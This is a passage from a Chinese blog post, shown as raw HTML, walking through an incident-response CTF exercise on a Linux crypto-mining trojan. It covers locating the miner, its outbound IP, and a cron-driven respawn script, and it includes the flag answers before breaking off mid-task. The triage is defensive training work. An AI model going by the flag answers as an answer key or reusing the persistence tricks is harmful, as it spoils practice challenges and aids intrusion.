+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767273209369-3d015f3d-5eae-45ee-b6f9-bfcbedd6a787.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767273303582-9ed1d55e-828f-457f-b3ac-43da522c089a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767273515194-2a14026e-b944-4561-bfd3-f8e357bb41aa.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767273961123-ef1696f2-4729-48a9-88fc-7fb65924a473.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767274354245-969071c1-f9e1-4a75-bca1-e1b714b71426.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767274511449-829f4110-46e4-4ad5-95d3-578c7527f4ed.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767275652210-a6d64216-2a93-4d5d-9699-b30ff0b639d9.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767320407608-bdc06b9a-f003-47e0-8a33-d9ece116f310.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767320482090-6115fb28-9382-4d13-b620-a0fac2304259.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767278564501-c025b820-79cb-4b24-8ce4-2539197bda74.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767288270483-0b21fdc7-2e25-4d49-8365-4107b42be751.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322499972-a3510d41-876f-47a8-8d9f-4d710eca0e7a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322484776-857ddbb7-5b39-4b82-ba9d-c8998f82b95c.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322374606-f2d1a901-1eb4-496f-b354-f33fade25e48.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767321058659-8d7e5a2c-b35c-4bab-83ed-17f8c4565e77.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322553761-4fbff05d-cc68-473f-821e-70b1933e01cf.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767321129721-cccf1272-1e4e-4623-b363-b9891a6dcc88.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767321148461-93925c62-ebde-4b1a-bd51-90f3679a78c6.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322054369-79d784fa-f599-4d80-9fa5-dbbe9302fcbb.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322085753-9e265741-162b-4e98-b381-18377e59d2cf.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322151667-a43bf094-6ea5-4c62-9066-29f5fca3bb8a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322196432-08a018b3-23fe-4688-ad45-9c6880a43ea8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322215868-2d351f19-460f-4166-b183-1a334a5cbe05.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322800347-20e3e08e-ffd5-4bb4-819a-ddf8e9ffa676.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322981002-c1184ffe-4bc7-4f38-871d-b997f8363349.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767323086879-5313c8f5-45ae-4742-bf2f-8511124e3089.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767323287264-40778d13-e9b9-4b4f-96b4-eea550fae105.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767323320709-20f099f1-ec52-4a57-8369-d47031b8de81.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767323405965-3c8958ea-50a2-4c7d-a763-667dd38a4b3a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767323475762-6b65aa04-5d59-441e-a997-20931778d61b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767323676865-b40d6b27-71b0-4c5f-8434-b3e67a54899c.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767323986470-845b3ab9-ad24-40a7-a1fe-c5fa6eaf94a8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767324010982-d9da6d28-6f8b-4527-80d0-6e298881c10e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767324061309-a2141c81-9e1e-4b40-b3de-a672e19a3551.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767324086459-e59976b1-8b19-4707-995d-a89b72bffc68.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767324125596-7ee0ed03-4e19-4004-a6cf-feaa8dd4e189.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767324172557-778873ef-da52-42e2-9031-bdc171e09739.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767324804951-35566c7f-68b3-4aae-816b-8b7ce44cc704.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767324886363-bdb0cf96-bf95-47f4-aba9-b16f84a31aa7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767324932961-f08044ce-6096-4cae-b622-d004716cf5cb.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767325023104-19041fb4-c26b-40ba-8c89-7a5d736242b7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767325102350-08fd199a-c83f-407f-89e8-0de71f72fa3b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767325196204-5ad9402c-0aa6-4966-9480-dc226657517b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767325227845-247f3817-26dd-4e4f-8d6b-3236fa45e6dc.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767325536298-cdda9f93-9912-4c1f-aa4f-fb8fcc104d8d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767325474587-ddad9d26-3f2e-4d31-b000-8859988f8188.png">
+<meta property="article:published_time" content="2026-01-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-01-02T03:57:17.012Z">
+<meta property="article:author" content="Meiyouqian">
+<meta property="article:tag" content="Misc">
+<meta property="article:tag" content="Reverse">
+<meta property="article:tag" content="应急响应">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://mei-you-qian.github.io/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767000566941-9b5221a7-c7d1-41ba-9a56-941ac4bfd219.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>应急响应练习：青少年CTF靶场（全） - 玫幽倩的小博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+<link rel="stylesheet" href="/css/mk.css">
+<link rel="stylesheet" href="/css/selection.css">
+<link rel="stylesheet" href="/css/glassBg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"mei-you-qian.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>玫幽倩</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/lottery/" target="_self">
+                <i class="iconfont icon-gift-fill"></i>
+                <span>🎁 抽奖</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/beijing.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="应急响应练习：青少年CTF靶场（全）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-01-02 00:00" pubdate>
+          2026年1月2日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          57 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">应急响应练习：青少年CTF靶场（全）</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="特洛伊挖矿木马事件排查"><a href="#特洛伊挖矿木马事件排查" class="headerlink" title="特洛伊挖矿木马事件排查"></a>特洛伊挖矿木马事件排查</h1><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767000566941-9b5221a7-c7d1-41ba-9a56-941ac4bfd219.png" srcset="/img/loading.gif" lazyload></p>
+<p>真不是我说，这和我遇到的那个kdevtmpfsi听着怎么能那么像，真的没忍住来做一下，别告诉我真就是kdevtmpfsi</p>
+<h2 id="任务一：提交挖矿文件的绝对路径"><a href="#任务一：提交挖矿文件的绝对路径" class="headerlink" title="任务一：提交挖矿文件的绝对路径"></a>任务一：提交挖矿文件的绝对路径</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767000512904-3909a3d9-59f5-46ac-939e-020d385b2a0a.png" srcset="/img/loading.gif" lazyload></p>
+<p>上来找挖矿文件的绝对路径，既然题目说了是CPU使用率异常飙高，那我们就降序看看进程的CPU占用情况</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767059278935-4a2d1497-1327-4ce3-9bbd-d76e700694d5.png" srcset="/img/loading.gif" lazyload></p>
+<p>先用top，发现没有了，可能是被感染了，那试试看ps aux</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ps aux --sort=-%cpu | head<br></code></pre></td></tr></table></figure>
+
+<p>降序看看进程CPU占用情况</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767001706354-b7c1f9b2-f351-4952-82a5-69b2bd657c58.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到CPU异常高的只有第一个（没有kdevtmpfsi吓人啊）</p>
+<p>这进程的命令是&#x2F;tmp&#x2F;kworkerds，正常的系统内核工作线程应该是kworker才对，而且也不该在&#x2F;tmp路径，所以这玩意很可疑，很有可能就是所谓的挖矿文件</p>
+<p>所以本题的答案就是这一个高嫌疑的&#x2F;tmp&#x2F;kworkerds</p>
+<p>flag{&#x2F;tmp&#x2F;kworkerds}</p>
+<h2 id="任务二：提交挖矿文件的外联IP"><a href="#任务二：提交挖矿文件的外联IP" class="headerlink" title="任务二：提交挖矿文件的外联IP"></a>任务二：<font style="color:rgba(0, 0, 0, 0.88);">提交挖矿文件的外联IP</font></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767001902008-8772ab20-3494-4099-a2d7-867d5e76a7b2.png" srcset="/img/loading.gif" lazyload></p>
+<p>刚刚已经找到了可疑进程的PID是306</p>
+<p>题目问挖矿文件的外联IP，其实就是问的网络连接情况</p>
+<p>我们用netstat或者ss都可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">netstat -anp | grep 306<br>ss -anp | grep 306<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767002156682-52ccedd3-0a07-4800-b9b7-c894d930638a.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们-a显示所有链接，然后-n看ip</p>
+<p>这边就能直接看到外网的外联ip和端口是那个104.21.6.99:10235</p>
+<p>这个10235是一个非标准的高位端口，在这种恶意文件里很常见</p>
+<h2 id="任务三：守护进程脚本的绝对路径"><a href="#任务三：守护进程脚本的绝对路径" class="headerlink" title="任务三：守护进程脚本的绝对路径"></a>任务三：<font style="color:rgba(0, 0, 0, 0.88);">守护进程脚本的绝对路径</font></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767002423576-75ed7fa5-686a-4c2d-bf56-09ddb22c1579.png" srcset="/img/loading.gif" lazyload></p>
+<p>一般的木马都会搭配有守护进程脚本，以防止木马被kill后就没了，守护进程会使其再生，正如我中的kdevtmpfsi自带守护进程kinsing</p>
+<blockquote>
+<!-- 这是一张图片，ocr 内容为： --><p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1766397425604-b773e816-4931-4357-89c2-5a442a564ebe.png" srcset="/img/loading.gif" lazyload></p>
+</blockquote>
+<p>直接找有点没有头绪，不妨我们跟着题目提示，先试试看删了这玩意会不会再蹦出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">kill -9 进程号<br></code></pre></td></tr></table></figure>
+
+<p>发现了删了没几秒就又崩了一个出来</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767002975109-23cf8c3c-e474-4994-82d3-f3a8231a3b47.png" srcset="/img/loading.gif" lazyload></p>
+<p>有点太快了吧这也</p>
+<p>接下来我们尝试直接删除&#x2F;tmp&#x2F;kworkerds文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">rm -rf /tmp/kworderds<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767003065257-0b43cbc1-f4eb-4053-a0eb-77a4eb22788a.png" srcset="/img/loading.gif" lazyload></p>
+<p>真是似曾相识来了，之前的kdevtmpfsi也是说我一个root没权限</p>
+<p>可能是用了文件锁，跟上次一样，我们用lsattr看看属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">chattr加锁<br>lsattr看锁<br>lsattr /tmp/kworkerds<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767003217858-60c311a3-0b18-44ea-9577-987b78fb35da.png" srcset="/img/loading.gif" lazyload></p>
+<p>坏了，没说不能删，但是真的删不了</p>
+<p>可能是rm被感染了，用不了这玩意了</p>
+<p>既然直接rm做不了了，我们可以尝试利用集成的Linux工具集busybox进行rm，这玩意特别适合嵌入式系统和资源受限的环境，正好应对这种污染情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">busybox rm -rf /tmp/kworkerds<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767003303975-5cd326ae-1126-455e-bac4-96ad275f7d88.png" srcset="/img/loading.gif" lazyload></p>
+<p>完全没报错，说明删掉了，但是还是有这个玩意</p>
+<p>这说明要么就是有文件每秒都在生成挖矿文件，要么就是有文件检测这玩意还在不在，不在就生</p>
+<p>来检测一下计划任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">crontab -l<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767003488693-2366ca66-017a-4789-9ddc-78390f874afa.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现没有计划任务啊，至少root没有</p>
+<p>也有可能是系统级别的？再cat文件看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cat /etc/crontab<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767003686971-08a31f3c-f851-4a0b-9ed4-11d9dc1fa7e2.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现也没啥玩意，都找不到</p>
+<p>不过值得注意的是，系统级别的计划任务还可能分布在&#x2F;etc&#x2F;cron.d&#x2F;、&#x2F;etc&#x2F;cron.hourly&#x2F;等等目录里，我们用通配符*直接一起搜了，这些地方我们crontab -l都是不显示的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ls -la /etc/cron*<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767003922131-eedcef2c-ccb5-49ea-a0fb-b2d66a29de10.png" srcset="/img/loading.gif" lazyload></p>
+<p>这下看到了，这个0guardian也太显眼了，名字就很逆天了</p>
+<p>为了验证，我们可以cat看看内容</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004056435-de4b2456-91ee-4b3c-b3ca-78fa0c610c2b.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现是每分钟都在执行，这玩意的频率太高了，很像而已进程，我们去看看它要执行的.0guardian</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cat /usr/bin/.0guardian<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004155454-1a131001-a778-4fdc-a634-40d3bedab905.png" srcset="/img/loading.gif" lazyload></p>
+<p>这脚本还挺直接的，直接说了自己是守护脚本</p>
+<p>当然也很简洁了，就一行，这边是在用stat命令看&#x2F;tmp的情况，而且不回显</p>
+<p>这边很有可能是感染了stat函数，使其不只是单纯的查看</p>
+<p>我们自己调用stat也发现了这个命令无法做到一些本来能做到的事情了，确认已被感染的事实</p>
+<p>因此再生的思路已经明确了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">1，设置计划任务每分钟执行一次<br>2，调用.0guardian<br>3，stat /tmp，执行魔改stat<br>4，猜测是看/tmp下边有没有病毒文件，有无所谓，没有就再生了<br></code></pre></td></tr></table></figure>
+
+<p>所以这一题的答案很明确了，是flag{&#x2F;usr&#x2F;bin&#x2F;.0guardian}</p>
+<h2 id="任务四：异常处理"><a href="#任务四：异常处理" class="headerlink" title="任务四：异常处理"></a>任务四：<font style="color:rgba(0, 0, 0, 0.88);">异常处理</font></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767004476254-12d7d393-023b-443e-89ce-565e4ca87f0e.png" srcset="/img/loading.gif" lazyload></p>
+<p>哦？还有以人为本这一块</p>
+<p>我们直接打开虚拟机上的火狐，然后访问这个网址看看</p>
+<!-- 这是一张图片，ocr 内容为： -->
